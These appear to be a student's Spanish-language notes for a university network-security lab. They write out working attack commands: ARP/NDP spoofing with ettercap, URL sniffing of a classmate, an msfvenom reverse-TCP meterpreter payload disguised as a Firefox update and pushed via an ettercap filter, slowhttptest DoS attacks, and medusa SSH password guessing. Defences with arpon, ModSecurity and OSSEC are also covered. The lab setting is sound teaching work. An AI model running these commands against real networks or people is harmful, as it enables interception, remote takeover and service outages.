---
Name: Práctica 2
tags:
  - práctica
asignatura: LSI
---
***[[Legislación y Seguridad Informática]]***

*CATEGORÍAS DE ATAQUES*

1. **Instale el ettercap y pruebe sus opciones básicas en línea de comando**
	Opciones:
	- `T/G/C`: Ejecuta ettercap en modo texto/GTK/Ncurses.
	- `Tq`: No muestre los mensajes
	- `q`: Modo silencioso, no muestra el contenido de los paquetes excepto el de los que contienen las contraseñas
	- `M`: <método:[opción, ...]> Realiza un ataque man in the middle usando el método especificado por ‘método’ y con las opciones especificadas por ‘opción’
	- `arp`: Nos permite redirigir el tráfico usando arp-spoofing:remote tráfico del exterior
	- `port`: Permite realizar port-stealing sobre un switch Ethernet
	- `otros`: icmp, dhcp, ndp
	- `i`: Permite especificar la interfaz de red
	- `p`: No activa la tarjeta en modo promiscuo
	- `u`: Sitúa el ettercap en modo no ofensivo. En este modo ettercap no redirige los paquetes que analiza, lo que permite ejecutar múltiples instancias sobre una máquina sin duplicar paquetes
	- `P`: Carga un plugin de ettercap.
	- `P list`: Muestra una lista de los plugins disponibles
	- `L`: Guarda en formato binario todos los paquetes, así como información sobre contraseñas y host en el fichero especificado por ‘logfile’
	- `w`: para guardar el pcapfile

2. **Capture paquetería variada de su compañero de prácticas que incluya varias sesiones HTTP. Sobre esta paquetería (puede utilizar el wireshark para los siguientes subapartados)**
	1. Hacer un MITM a la máquina del compañero
		`ettercap -T -q -i ens33 -M arp:remote /IP carlos// /10.11.48.1//`
	2. En otra terminal, hacer `tcpdump` para guardar el tráfico capturado en un fichero `trafico.pcap`
		`tcpdump -i ens33 -s 65535 -w trafico.pcap`
	3. Desde la máquina local, hacer `scp` para obtener el fichero
		`scp lsi@10.11.49.52:/home/lsi/trafico.pcap`
	4. Ejecutamos WireShark y abrimos el archivo para analizar
		- ***Identifique los campos de cabecera de un paquete TCP.***
			1. Filtrar por TCP.
			2. Seleccionar paquete.
			3. Pulsar en Transmission Control Protocol.
		- ***Filtre la captura para obtener el tráfico HTTP.***
			1. Filtrar por HTTP.
		- ***Obtenga los distintos “objetos” del tráfico HTTP (imágenes, pdfs, etc.).***
			1. Filtrar por HTTP.
			2. Seleccionar paquete.
			3. Archivo -> Exportar objetos -> HTTP.
		- ***Visualice la paquetería TCP de una determinada sesión.*** 
			1. Filtrar por TCP.
			2. Seleccionar paquete.
			3. Analizar -> Seguir -> Secuencia TCP.
		- ***Sobre el total de la paquetería obtenga estadísticas del tráfico por protocolo como fuente de información para un análisis básico del tráfico.*** 
			1. Estadísticas -> Jerarquía de protocolo.
		- ***Obtenga información del tráfico de las distintas “conversaciones” mantenidas.***
			1. Estadísticas -> Conversaciones.
		- ***Obtenga direcciones finales del tráfico de los distintos protocolos como mecanismo para determinar qué circula por nuestras redes.***
			1. Estadísticas -> Puntos finales.

3. **Obtenga la relación de las direcciones MAC de los equipos de su segmento.**
	`nmap -sP 10.11.48.0/23` -> HostDiscovery contra todas las máquinas.
	Realiza un Ping Scan, solo verifica si los hosts están activos sin realizar escaneo de puertos completo. Se usa para descubrir qué dispositivos están encendidos y conectados a la red, pero no investiga los servicios o puertos específicos de cada host.
	```
	Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-28 11:19 CET
	Nmap scan report for 10.11.48.1
	Host is up (0.0013s latency).
	MAC Address: DC:08:56:10:84:B9 (Alcatel-Lucent Enterprise)
	Nmap scan report for 10.11.48.16
	Host is up (0.0012s latency).
	MAC Address: 00:50:56:97:E1:01 (VMware)
	Nmap scan report for 10.11.48.17
	Host is up (0.0020s latency).
	...
	```

4. **Obtenga la relación de las direcciones IPv6 de su segmento.**
	Local link:
	1. `apt install thc-ipv6`
	2. `ip neigh flush all` -> limpia la tabla de vecinos del kernel
	3. `atk6-alive6 ens33` -> manda paquetes ICMP por el segmento.
	4. `ip -6 neigh` -> sondea la interfaz construyendo una lista de hosts

	Para obtener la relación de las IPv6 del segmento hacemos el script:
	```ssh
	#!/bin/bash

	network_prefix="2002:a0b:3"
	for i in {1..510}; do
		ipv6_address="$network_prefix$(printf '%03x' $i)::"
		echo
		echo "$ipv6_address"
		nmap -6 -sL $ipv6_address
		echo
	done
	echo "Escaneo listo"
	```

5. **Obtenga el tráfico de entrada y salida legítimo de su interface de red ens33 e investigue los servicios, conexiones y protocolos involucrados.**
	Capturar tráfico de `ens33`, generar un `pcap` y abrirlo en `wireshark`. 
	Utilizar `tcpdump ens33 fichero`.

	`tcpdump -i ens33 -s 65535 -w mitrafico.pcap`
	```
	scp lsi@10.11.49.52:/home/lsi/mitrafico.pcap C:\Users\novoo\OneDrive\Documents\LSI
	```

6. **Mediante arpspoofing entre una máquina objetivo (víctima) y el router del laboratorio obtenga todas las URL HTTP visitadas por la víctima.**
	```
	ettercap -i ens33 -P remote_browser -P repoison_arp -Tq -M arp:remote /IP carlos// /10.11.48.1//
	```
	En otra shell:
	- `urlsnarf -i ens33`

	En la shell víctima:
	- `lynx http://...`

7. **Instale metasploit. Haga un ejecutable que incluya un Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute**
	Instalar metasploit -> google -> instalación metasploit en debian 12
	*Atacante*
		Crear binario troyanizado (payload):
		`msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.11.49.52 lport=1234 -f elf -o firefox_update_carlota.exe`
		`mv firefox_update_carlota.exe /var/www/html`
		`etterfilter ett.filter -o ett.ef`
		`cd /var/www/html`
		`ettercap -Tq -F ett.ef -i ens33 -M arp:remote /10.11.49.50// /10.11.48.1//`
		Ejecutar metasploit:
			1. `msfconsole`
			2. `use exploit/multi/handler`
			3. `set payload linux/x64/meterpreter_reverse_tcp`
			4. `set lhost 10.11.49.52`
			5. `set lport 1234`
			6. `exploit`
	*Víctima*
		`lynx www.google.com`
		`chmod u+x ./metasploit.exe`
		`./metasploit.exe`

8. **Haga un MITM en IPv6 y visualice la paquetería.**
	*Atacante*
	```
	ettercap -i ens33 -Tq -M ndp:remote //IPv6_compa/ /10.11.48.1//
	```
	En paralelo capturamos la paquetería
	```
	tcpdump -i ens33 -s 65535 -w MITMIPv6.pcap
	```
	*Víctima*
	`ping6 -c 2 -I ens33 ff02::1`

	Abrir archivo en WireShark, filtramos con `ipv6` y deberían aparecer paquetes tipo ICMPv6 de ping6..

9. **Pruebe alguna herramienta y técnica de detección del sniffing (preferiblemente arpon)**
	Instalar arpon -> `apt install arpon`
	Configurar ruta -> `nano /etc/arpon.conf`
	Comentamos todas las líneas que tiene el archivo y añadimos la MAC del compañero (00:50:56:97:F4:44), del router (DC:08:56:10:84:B9) y la nuestra (`ifconfig` y ver campo `ether` para obtener nuestra MAC -> 00:50:56:97:f0:04).
	
	*Víctima*
	`arp -a | grep "(10.11.48.1)"`
	
	*Atacante*
	`ettercap -i ens33 -tq -M arp:remote /10.11.49.52// /10.11.48.1//`
	
	*Víctima*
	`arp -a | grep "(10.11.48.1)"` Cambia la MAC del router
	`systemctl start arpon`
	`arpon -d -i ens33 -S`
	
	*Atacante*
	`ettercap -i ens33 -tq -M arp:remote /10.11.49.52// /10.11.48.1//`

	*Víctima*
	`arp -a | grep "(10.11.48.1)"` No cambia la MAC del router
	`systemctl start arpon`
	`systemctl disable arpon`
	`systemctl mask arpon`

10. **Pruebe distintas técnicas de host discovey, port scanning y OS fingerprinting sobre las máquinas del laboratorio de prácticas en IPv4. Realice alguna de las pruebas de port scanning sobre IPv6. ¿Coinciden los servicios prestados por un sistema con los de IPv4?.**
	*Host discovery*
	`nmap -sL 10.11.48.0/23` Hosts activos
	`nmap -sP 10.11.48.0/23` Hosts activos y MACs

	*Port scanning*
	`nmap -sS 10.11.49.50` Puertos abiertos en la máquina

	*Fingerprinting*
	`nmap -O 10.11.49.50` Fingerprinting de SO

	*Escaneo a nivel de IPv6*
	`nmap -6 -p 22, 80 -n dir_ipv6`

	*Respuesta a la pregunta*
	Coinciden ya que IPv4 es responsable de encaminar paquetes de datos desde una fuente a un destino a través de una red de routers, garantizando que los paquetes lleguen a su destino correcto. Además, incluye un campo de checksum que permite la detección de errores en los paquetes de datos durante su tránsito por la red.

11. **Obtenga información “en tiempo real” sobre las conexiones de su máquina, así como del ancho de banda consumido en cada una de ellas.**
	`iftop -i ens33`
	Si se ejecuta alguno de los comandos del apartado anterior en otra terminal, con este comando se puede ver todo lo que hace `nmap` en tiempo real.
	- *Primera columna*: IP origen.
	- *Segunda columna*: dirección de tráfico.
	- *Tercera columna*: IP destino.
	- *Últimas tres columnas*: ancho de banda en los últimos 2, 10 y 40 segundos.

	Para ver ancho de banda en tiempo real:
	`vnstat -l -i ens33`
	- `rx`: tráfico de entrada
	- `tx`: tráfico de salida

	Si queremos mostrarlo por horas:
	`vnstat -h`

12. **Monitorizamos nuestra infraestructura (prometheus, node_exporter y grafana)**
	*Iniciar Prometheus*
	En una terminal
	1. `cd node_exporter...`
	2. `./node_exporter`

	En otra terminal
	1. `cd prometheus...`
	2. `./prometheus --config.file=./prometheus.yml`

	*En los ataques de los apartados m y n busque posibles alteraciones en las métricas visualizadas.*
	```
		slowhttptest -c 8000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.49.52:9100 -x 24 -p 3
	```

13. **PARA PLANTEAR DE FORMA TEÓRICA**
	- *¿Cómo podría hacer un DoS de tipo direct attack contra un equipo de la red de prácticas?*
		Se hace atacando al puerto 22 (ssh). Si está conectado, se atacan los puertos que tenga abiertos. Se inyectan paquetes de manera directa para inundar una IP de destino.
	- *¿Y mediante un DoS de tipo reflective flooding attack?*
		Se inyectan paquetes con IP origen la máquina que se quiere inundar e IP destino otras máquinas. No son paquetes directos a la máquina que se quiere inundar, se envían paquetes a otras máquinas para que, cuando respondan, se inunde la máquina que se quería inundar.

14. **Ataque un servidor apache instalado en algunas de las máquinas del laboratorio de prácticas para tratar de provocarle una DoS. Utilice herramientas DoS que trabajen a nivel de aplicación (capa 7).**
	Un típico ataque de DoS para páginas web es mandar un número grande de paquetes y saturarlo para que no funcione o, si funciona, que lo haga lento.
	
	Ataque de denegación de servicio:
	- `slowhttptest`: permite implementar los ataques típicos a servidores web.
	- `slowhttptest -c 1000 -g -X -o show-files -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 http://10.11.49.50 -p 3`
		- `-c`: número de conexiones
		- `-g`: genera un flowchart con gráficas de cómo se comportan las conexiones.
		- `-X`: ataque que se va a hacer, ataque READ (lectura con GETS)
			- `-H`: ataque con HEADS
			- `-B`: ataque tipo POST
		- `-o`: genera fichero con los parámetros del ataque
		- `-r`: número de conexiones por segundo
		- `-w -y`: ventana de lectura de bytes
		- `-n 5`: intervalo en segundos de la lectura de buffers

	Víctima:
	`wget http://10.11.49.50`

	*Tipos de ataques `slowhttptest`*:
	1. **Slowloris**
		```
		slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://10.11.49.50 -x 24 -p 3
		```
		Envía cabeceras HTTP incompletas, el servidor no considera las sesiones establecidas y las deja abiertas, afectando al número de conexiones máximas configuradas.
	2. **R-U-Dead-Yet**
		```
		slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://10.49.50 -x 10 -p 3
		```
		En este ataque, se envían solicitudes `POST` con una cabecera completa que incluye un campo `Content-Length` especificando la longitud del cuerpo que se enviará. Sin embargo, se envían menos bytes de los indicados en `Content-Length`, haciendo que el servidor espere hasta recibir el resto del cuerpo. Esto mantiene las conexiones abiertas y consume recursos del servidor.
	3. **Apache killer**
		```
		slowhttptest -R -u http://host.example.com/ -t HEAD -c 1000 -a 10 -b 3000 -r 500
		```
		Utiliza la cabecera `Range`, permitiendo solicitar partes específicas de un archivo. Se envían peticiones con rangos de bytes superpuestos en la cabecera, lo que fuerza al servidor a realizar múltiples operaciones de lectura para la misma solicitud. Esto consume memoria y CPU, especialmente para servidores Apache que tienen configuraciones permisivas para las cabeceras `Range`.

	*¿Cómo podría proteger dicho servicio ante este tipo de ataque? ¿Y si se produjese desde fuera de su segmento de red?*
	Para parar estos ataques se usan firewalls como ModSecurity.

	*¿Cómo podría tratar de saltarse dicha protección?*
	Usar BOTNET o IPs aleatorias si estamos en la misma red.

15. **Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?**

	**INSTALAR MODSECURITY**
	1. `apt install libapache2-mod-security2`
	2. `systemctl restart apache2.service`
	3. `/etc/apache2/apache2.conf`
		- `serverName lsi.es`
	4. `/etc/hosts`
		 - `10.11.49.52 lsi.es`
	5. `/etc/modsecurity/*.conf`
	6. `/etc/share/mod-security-cvs/*.`
	7. `/etc/modsecurity/modsecurity.conf-recomended` -> renombrar como `modsecurity.conf`
		```
		SecRuleEngine On

		SecConnEngine On
		SecConnWriteStateLimit 40
		SecConnReadStateLimit 40
		```
	8. `systemctl restart apache2.service`

	`a2enmod security2` -> activa modsecurity (RESTART DE APACHE2 DESPUÉS)
	
	`a2dismod security2` -> desactiva modsecurity (RESTART DE APACHE2 DESPUÉS)

	**ACTIVAR MODSECURITY EN APACHE2**
	1. `/etc/apache2/mods-available/security2.conf`
		```
		SecDataDir /var/cache/modsecurity
		Include /etc/share/modsecurity-crs/crs-setup.conf
		Include /etc/share/modsecurity-crs/rules/*.conf
		```

	**COMPROBACIÓN DE FUNCIONAMIENTO**
	*Atacante*
	```
	slowhttptest -c 200 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.135 -x 24 -p 3
	```

	*Víctima*
	`lynx http://10.11.49.52:80`

16. **Buscamos información**
	- *Obtenga de forma pasiva el direccionamiento público IPv4 e IPv6 asignado a la Universidade da Coruña.*
		1. `apt install host`
		2. `host udc.es`
		```
		udc.es has address 193.144.53.84
		udc.es has IPv6 address 2001:720:121c:e000::203
		udc.es mail is handled by 10 udc-es.mail.protection.outlook.com.
		```
	
	- *Obtenga información sobre el direccionamiento de los servidores DNS y MX de la Universidade da Coruña.*
		1. `apt install dnsutils`
		
		Para servidores DNS:
		`dig NS udc.es`
		![[Pasted image 20241102124349.png]]

		Para servidores MX (estafas de correos):
		`dig MX udc.es`
		![[Pasted image 20241102124446.png]]

	- *¿Puede hacer una transferencia de zona sobre los servidores DNS de la UDC?. En caso negativo, obtenga todos los nombres dominio posibles de la UDC.*
		Una transferencia de zona sobre servidores DNS es un proceso en el que el servidor DNS obtiene una copia completa de la BBDD de zona de otro servidor DNS. No se puede hacer ya que están restringidos a gente autorizada.

		Obtener nombres de dominio de la UDC:
		1. `apt install dnsrecon`
		2. `dnsrecon -d udc.es`
		![[Pasted image 20241106182715.png]]

	- *¿Qué gestor de contenidos se utiliza en www.usc.es?*
		1. Instalar `whatweb`
			Enseña información sobre las tecnologías y servicios utilizados
			`apt install whatweb`
		2. Ejecutar comando
			`whatweb www.usc.es`

17. **Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.**
	- `nmap -sL 10.11.48.0/23` # Lista
	- `nmap -sP 10.11.48.0/23` # Host discovery
	- `nmap -sV 10.11.49.50` # Escaneo de servicio
	- `nmap -sV -p 22 10.11.49.50` # Escaneo de un servicio concreto

18. **Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.**

	1. Instalar medusa -> `apt install medusa`
	2. En el fichero `10k-most-common.txt` poner contraseña de compañero
	3. Ejecutar el siguiente comando
		```
		medusa -h 10.11.49.50 -u lsi -P 10k-most-common.txt -M ssh -f -O logpassguessing.log
		```
	4. `tail -f /var/log/auth.log` → revisamos que los intentos fallidos de autenticación se hayan registrado correctamente en la máquina de la víctima
19. **Configure algún sistema activo, por ejemplo OSSEC, y pruebe su funcionamiento ante un “password guessing”.**
	1. `/var/ossec/etc/ossec.conf`
			`host.deny` -> 120
			`firewall.deny` -> 120
		`restart ossec.service`
	2. Iniciar OSSEC -> `/var/ossec/bin/ossec-control start`

	**COMPROBACIÓN**
	1. Lanzar ataque con medusa (apartado anterior).
	2. Si llega al cuarto intento y queda parado, quiere decir que estás baneado y no puedes intentarlo hasta dentro de 600 segundos.
	3. Para desbanear manualmente:
		```
		/var/ossec/active-response/bin/host-deny.sh delete - 10.11.49.50

		/var/ossec/active-response/bin/firewall-drop.sh delete - 10.11.49.50
		```

	4. Mirar los logs del archivo de medusa o cualquiera de los siguientes:
		`/var/ossec/logs/ossec.log`
		`/var/ossec/logs/active-responses.log`

20. **Supongamos que una máquina ha sido comprometida y disponemos de un fichero con sus mensajes de log. Procese dicho fichero con OSSEC para tratar de localizar evidencias de lo acontecido (“post mortem”). Muestre las alertas detectadas con su grado de criticidad, así como un resumen de las mismas.**

	Para ver información sobre los ataques de password guessing que se hicieron a la máquina:
	```
	cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a
	```

	Para ver un resumen de las IPs que intentaron atacar, las reglas de OSSEC que se saltaron o los niveles de OSSEC:
	```
	cat /var/log/auth.log | /var/ossec/bin/ossec-logtest -a | /var/ossec/bin/ossec-reportd
	```


![[Pasted image 20241108193227.png]]

![[Pasted image 20241108193256.png]]

![[Pasted image 20241108193306.png]]

![[Pasted image 20241108193320.png]]
